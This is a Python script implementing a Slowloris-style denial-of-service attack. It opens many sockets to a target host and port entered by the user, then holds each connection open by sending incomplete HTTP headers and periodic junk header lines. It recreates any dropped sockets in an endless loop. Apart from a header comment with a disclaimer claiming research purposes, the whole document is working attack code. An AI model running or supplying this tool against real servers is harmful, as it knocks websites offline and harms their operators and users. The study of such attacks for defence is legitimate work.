'''
This program implements  the basic functionality of DOS attack, similar to Slowloris. 
With the help of Empty header, the code will try to engage the server for the time,
till incomplete requests are being made. 
Refer to Line 25 and 51 where we are sending only 1 line feed in place of 2 Line feeds, which marks the end of HTTP packet. Due to this the server will wait for other line feed for endless time.
The code will reinitiate the sockets which are being closed. 
Code written and executed By- Akhil Upadhyay PESU Cybersecurity group Head R&D dept. Head 
For any queries contact me on github- username akhil1010
The Author will not be responible for any type of malpractices or malicious activities anywhere using this code,as the code is written solely for the research and related purposes. 
**************************************************************************************************************************************************************************************************
'''
import logging
import re
import socket
import random
import time
list_of_sockets=[]
def init_sock(ip,port):
    user_agent=["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"]    #given a default user name
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(4)																#for setting timeout
    s.connect((ip,port))															#connecting and making a TCP connection
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))								#sending an empty Get request Http header
    s.send("User-Agent: {}\r\n".format(user_agent[0]).encode("utf-8"))										#sending with the default user agent
    s.send("{}\r\n".format("Accept-Language: en-us,en;q=0.5").encode("utf-8"))									
    """***Main part of denos, The header is not full, it will make the server wait for next empty line but it will not going to happen in this code so server will wait forever***"""
    return s

def main():																	#wait function
    #sockets,port=100,80
    ip=input("Enter the IP Address/Hostname of target: ")											#take the ip as input from user
    if len(ip)==0:
        print("User needs to enter one hostname")
        exit(1)
    port=int(input(("Enter the port: "))or 80)													#take the port as input default 80(http) 
    sockets=int(input(("Enter the number of sockets: "))or 100)											#take the socket as input or default 100
    print("""Attacking %s using %s sockets(\\0/) """ %(ip,sockets))					
    print("Creating New Socket...")
    for _ in range(sockets):															#create the socket connection using init function used in body
        try:
            s=init_sock(ip,port)														#function init_sock() being called here
        except socket.error:
            print("ERROR IN CREATING SOCKET %s" %(_))
            break
        list_of_sockets.append(s)														#update the list of sockets formed
    while True:																	#sending the headers repeatedly
        try: 
            print("Sending Incomplete http headers... Sockets formed: %s" %(len(list_of_sockets)))
            for s in list(list_of_sockets):
                try:
                    s.send("X-a:{}\r\n".format(random.randint(1,5000)).encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)
            #print("Recreating Socket")
            for _ in range(sockets-len(list_of_sockets)):											#recreate the connections if timeout occurs
                try:
                    s=init_sock(ip,port)
                    if s:
                        list_of_sockets.append(s)												#again sockets are formed which are being timeout
                except socket.error:
                    break
            time.sleep(15)
        except (KeyboardInterrupt,SystemExit):													#keyboard Interrupt
            print("\nStopping Slowloris...")
            exit(1)
if __name__=="__main__":															#calling main function
    main()
             
                            
                    
                    
                
                
            
